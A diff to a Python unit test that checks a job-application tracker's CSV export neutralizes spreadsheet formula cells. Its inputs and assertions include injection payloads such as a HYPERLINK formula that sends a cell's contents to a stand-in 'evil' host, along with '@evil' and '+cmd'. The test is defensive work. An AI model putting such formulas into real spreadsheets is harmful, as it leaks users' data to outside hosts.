@@ -179,11 +179,11 @@ def test_export_csv_neutralizes_formula_cells(db):
         raw_jd_text="build models",
         url="https://example.com/job",
     )
-    update_application_status(db, posting.id, "applied", resume_used="+cmd", notes="\t-1+1")
+    update_application_status(db, posting.id, "applied", resume_used="+cmd", notes="-1+1")
     response = export_applications_csv(db=db)
     rows = list(csv.reader(io.StringIO(response.body.decode())))
     assert rows[1][0] == '\'=HYPERLINK("http://evil/?"&A1,"x")'
     assert rows[1][1] == "'@evil"
     assert rows[1][4] == "'+cmd"
-    assert rows[1][7] == "'\t-1+1"
+    assert rows[1][7] == "'-1+1"
     assert rows[1][3] == "applied"
